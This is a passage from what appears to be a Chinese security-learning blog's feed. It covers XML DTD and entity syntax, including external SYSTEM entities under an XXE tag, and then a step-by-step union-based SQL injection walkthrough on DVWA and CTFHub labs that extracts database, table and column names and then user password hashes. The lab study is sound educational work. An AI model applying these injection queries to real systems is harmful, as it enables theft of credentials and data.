data）,字符数据就是闭合标签之间的文本内容</p><p><strong>这些文本将被解析器检查实体以及标记。</strong>文本中的标签会被当作标记来处理，而实体会被展开。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>此文本也会被解析<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据（character data）。<em>CDATA 是不会被解析器解析的文本。</em>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>CDATA 部分由 <code>&lt;![CDATA[</code> 开始，由<code>]]&gt;</code> 结束：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span><br><span class="language-xml"><span class="language-handlebars">function matchwo(a,b)</span></span><br><span class="language-xml"><span class="language-handlebars">&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">if (a &lt; b &amp;&amp; a &lt; 0) then</span></span><br><span class="language-xml"><span class="language-handlebars">  &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">  return 1;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">else</span></span><br><span class="language-xml"><span class="language-handlebars">  &#123;</span></span><br><span class="language-xml"><span class="language-handlebars">  return 0;</span></span><br><span class="language-xml"><span class="language-handlebars">  &#125;</span></span><br><span class="language-xml"><span class="language-handlebars">&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分。</p><p>标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或折行。</p></blockquote><h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">1⃣️&lt;!ELEMENT 元素名称 类别&gt;<br>2⃣️&lt;!ELEMENT 元素名称 (元素内容)&gt;<br></code></pre></td></tr></table></figure><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>利用关键字<code>EMPTY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ELEMENT 元素名称 EMPTY&gt;<br></code></pre></td></tr></table></figure><p>案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!--dtd中声明--&gt;<br>&lt;!ELEMENT br EMPTY&gt;<br>&lt;!--XML中--&gt;<br>&lt;br /&gt;<br></code></pre></td></tr></table></figure><h3 id="只有PCDATA的元素"><a href="#只有PCDATA的元素" class="headerlink" title="只有PCDATA的元素"></a>只有PCDATA的元素</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT 元素名称 (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>关键词<code>ANY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT 元素名称 ANY&gt;<br></code></pre></td></tr></table></figure><h3 id="带有子元素（序列）的元素"><a href="#带有子元素（序列）的元素" class="headerlink" title="带有子元素（序列）的元素"></a>带有子元素（序列）的元素</h3><p>带有一个或多个子元素的元素通过圆括号中的子元素名进行声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">1⃣️&lt;!ELEMENT 元素名称 (子元素名称 1)&gt;<br>2⃣️&lt;!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)&gt; &lt;!--由逗号分隔开的序列进行声明并且按照相同的顺序出现在XML文档中--&gt;<br></code></pre></td></tr></table></figure><h4 id="不同的元素声明"><a href="#不同的元素声明" class="headerlink" title="不同的元素声明"></a>不同的元素声明</h4><ul><li><p>子元素只出现一次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称)&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素出现零次或一次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称<span class="hljs-string">?)</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素出现零次或多次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称*)&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素出现一次或多次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称+)&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素为多选一类型：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称<span class="hljs-number">1</span>|<span class="hljs-params">元素名称2</span>|子元素名称<span class="hljs-number">3</span>|<span class="hljs-params">...)&gt;</span><br><span class="hljs-params"># 这里则不需要遵循子元素出现的顺序来写声明，只需包含所有可能出现的子元素即可（也可以添加一些不可能出现的元素，当然这样写并没有必要)</span><br><span class="hljs-params"># 只能出现一个，不然会报错</span><br></code></pre></td></tr></table></figure></li><li><p>多种类型的子元素混合：举个例子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> book (name,author?,(price|<span class="hljs-params">press</span>|date)*)&gt;<br></code></pre></td></tr></table></figure></li></ul><p>这个声明的含义为：<code>book</code>元素包含只出现一次的<code>name</code>子元素、出现零次或一次的<code>author</code>子元素以及出现零次或多次的<code>price</code>、<code>press</code>、<code>date</code>三个子元素中的一个</p><blockquote><p>对于<code>?</code>、<code>*</code>以及<code>+</code>这三个符号的含义，可以类比于正则表达式进行记忆</p></blockquote><h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;<br></code></pre></td></tr></table></figure><p>DTD 实例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;check&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>以下是<strong>属性类型</strong>的选项：</p><table><thead><tr><th align="left">类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">CDATA</td><td align="left">值为字符数据 (character data)</td></tr><tr><td align="left">(<em>en1</em>|<em>en2</em>|..)</td><td align="left">此值是枚举列表中的一个值</td></tr><tr><td align="left">ID</td><td align="left">值为唯一的 id</td></tr><tr><td align="left">IDREF</td><td align="left">值为另外一个元素的 id</td></tr><tr><td align="left">IDREFS</td><td align="left">值为其他 id 的列表</td></tr><tr><td align="left">NMTOKEN</td><td align="left">值为合法的 XML 名称</td></tr><tr><td align="left">NMTOKENS</td><td align="left">值为合法的 XML 名称的列表</td></tr><tr><td align="left">ENTITY</td><td align="left">值是一个实体</td></tr><tr><td align="left">ENTITIES</td><td align="left">值是一个实体列表</td></tr><tr><td align="left">NOTATION</td><td align="left">此值是符号的名称</td></tr><tr><td align="left">xml:</td><td align="left">值是一个预定义的 XML 值</td></tr></tbody></table><p>默认值参数可使用下列值：</p><table><thead><tr><th align="left">值</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left">值</td><td align="left">属性的默认值</td></tr><tr><td align="left">#REQUIRED</td><td align="left">属性值是必需的</td></tr><tr><td align="left">#IMPLIED</td><td align="left">属性不是必需的</td></tr><tr><td align="left">#FIXED value</td><td align="left">属性值是固定的</td></tr></tbody></table><p>🌰–规定一个默认的属性值</p><p>DTD: 给square元素规定了一个默认值为0的width属性,”square” 被定义为带有 CDATA 类型的 “width” 属性的空元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT square EMPTY&gt;<br>&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML: 仍可以给被预定义的属性赋值</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">square</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="IMPLIED"><a href="#IMPLIED" class="headerlink" title="#IMPLIED"></a>#IMPLIED</h3><p>属性不是必需的</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 #IMPLIED&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST contact fax CDATA #IMPLIED&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">contact</span> <span class="hljs-attr">fax</span>=<span class="hljs-string">&quot;555-667788&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">contact</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="REQUIRED"><a href="#REQUIRED" class="headerlink" title="#REQUIRED"></a>#REQUIRED</h3><p>属性是必需的,适用于没有默认值选项，但强制要求提交属性值</p><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 #REQUIRED&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST person number CDATA #REQUIRED&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> <span class="hljs-attr">number</span>=<span class="hljs-string">&quot;5677&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>非法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="FIXED"><a href="#FIXED" class="headerlink" title="#FIXED"></a>#FIXED</h3><p>属性值固定,预先定义属性值，不可更改(类比const)</p><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 #FIXED &quot;value&quot;&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST sender company CDATA #FIXED &quot;Microsoft&quot;&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span> <span class="hljs-attr">company</span>=<span class="hljs-string">&quot;Microsoft&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>非法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span> <span class="hljs-attr">company</span>=<span class="hljs-string">&quot;W3School&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="列举属性值"><a href="#列举属性值" class="headerlink" title="列举属性值"></a>列举属性值</h3><h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 (en1|en2|..) 默认值&gt;<br></code></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST payment type (check|cash) &quot;cash&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;check&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;cash&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><h3 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;<br>&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>一个实体由三部分构成: 一个和号 <code>&amp;</code>, 一个实体名称, 以及一个分号 <code>;</code></p></blockquote><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><h3 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; &lt;!--也可以用协议--&gt;<br></code></pre></td></tr></table></figure><p>💡不同环境下可用协议</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032236978.jpg" alt="aaa"></p><p>🌰</p><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;<br>&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="实体的嵌套"><a href="#实体的嵌套" class="headerlink" title="实体的嵌套"></a><strong>实体的嵌套</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY %实体名称 &quot;值&quot;&gt; &lt;!--内部--&gt;<br>&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt; &lt;!--外部--&gt;<br></code></pre></td></tr></table></figure><h3 id="实体分类"><a href="#实体分类" class="headerlink" title="实体分类"></a>实体分类</h3><p>实体又分为一般实体和参数实体,字符实体,命名实体</p><p>1，一般实体的声明语法:<!ENTITY 实体名 "实体内容"><br>引用实体的方式：&amp;实体名；</p><p>2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容"><br>引用实体的方式：%实体名；</p><blockquote><p>有SYSTEM关键字引用数据的实体就是参数实体</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入学习</title>
      <link href="/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>SQL注入是指在判断出注入点后，将<strong>恶意的SQL语句</strong>添加到输入参数中，使得后台服务器<u>执行添加的SQL语句</u>，从而达到窃取网站敏感信息等目的</p><h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png" alt="1"></p><h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><ul><li>发现主要执行的SQL语句为:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><blockquote><p>类似这类传入参数以<code>&#39;</code>包裹的称为字符型注入，可以通过传入 <code>1&#39; xxx#</code>(xxx为恶意的SQL语句)的方式来执行恶意的SQL语句<br><strong>原因</strong>:</p><ul><li>数字后跟的<code>&#39;</code>与源码中$id前的<code>&#39;</code>优先匹配，后面的SQL语句只要用union与前面的SELECT语句连接，就可以做到让后台服务器执行能达到攻击目的的SQL语句。</li><li>最后的<code>#</code>作用是将语句结尾的<code>&#39;</code>和<code>;</code>注释掉，将<code>&#39;</code>注释掉是为了防止语法错误，并且对于单句SQL语句即使没有<code>;</code>也可以正常执行</li></ul></blockquote><ul><li>回显部分的代码为:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>    <span class="hljs-comment">// Get values</span><br>    <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>    <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于使用while循环，可以猜想到如果执行的SQL语句union上别的SQL语句(联合查询)，只要查询的字段数和类型相同，每一行的数据都可以被回显出来</p></blockquote><h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png" alt="1"></p><h4 id="获取库名、表名、字段名"><a href="#获取库名、表名、字段名" class="headerlink" title="获取库名、表名、字段名"></a>获取库名、表名、字段名</h4><ul><li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221259.png" alt="1"></li></ul><blockquote><p>由于该情景下union后的select语句必须有两个字段，这里主要获取数据库名称，user()可以替换成其他函数或者常量等等都可以</p><h3 id="获取所有库名"><a href="#获取所有库名" class="headerlink" title="获取所有库名"></a>获取所有库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> group_concat(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata<br></code></pre></td></tr></table></figure></blockquote><ul><li>获取表名,这边需要了解到<code>information_schema</code>是mysql自带的数据库，其中名为<code>tables</code>的表中的两个字段<code>table_name</code>和<code>table_schema</code>记录了DBMS中的存储的表名和表名所在的数据库。现在我们已经知道了数据库名称为<code>dvwa</code>，可以加入WHERE进行条件查询,最终后台服务器运行的SQL语句为:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">union</span><br><span class="hljs-keyword">select</span> table_name, table_schema <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>得到表名有两个，分别为<code>guestbook</code>和 <code>users</code>，根据经验判断网站敏感信息存储在users表中</p></blockquote><ul><li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221711.png" alt="1"></p></li><li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221287.png" alt="1"></p></li></ul><h3 id="2-2-整数型注入-CTFHub技能树"><a href="#2-2-整数型注入-CTFHub技能树" class="headerlink" title="2.2 整数型注入(CTFHub技能树)"></a>2.2 整数型注入(CTFHub技能树)</h3><ul><li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221732.png" alt="1"></li></ul><blockquote><p>SQL中字符串自动转换成整型规律：从左边第一个字符开始排查起，转换成出现的第一个非数字字符前的数字对应的整型，如果第一个字符就不是数字，则转换成0</p></blockquote><ul><li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221925.png" alt="1"></li><li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222504.png" alt="1"></li></ul><h3 id="2-3-SQL盲注"><a href="#2-3-SQL盲注" class="headerlink" title="2.3 SQL盲注"></a>2.3 SQL盲注</h3><p>盲注指SQL语句执行查询后，查询数据不能回显到前端页面中</p><h4 id="可能需要用到的函数、关键字"><a href="#可能需要用到的函数、关键字" class="headerlink" title="可能需要用到的函数、关键字"></a>可能需要用到的函数、关键字</h4><ul><li>substr(字符串,索引开始位,索引结束位):用于获取字符串中的特定字符</li><li><code>limit 开始行数的索引,显示的总行数</code>:放在select查询语句最后,限制显示行数,索引从0开始</li><li>ascii(字符):将某个字符转换为ascii值</li><li>ord(str)：函数返回字符串str的最左边字符的ASCII码值</li></ul><h4 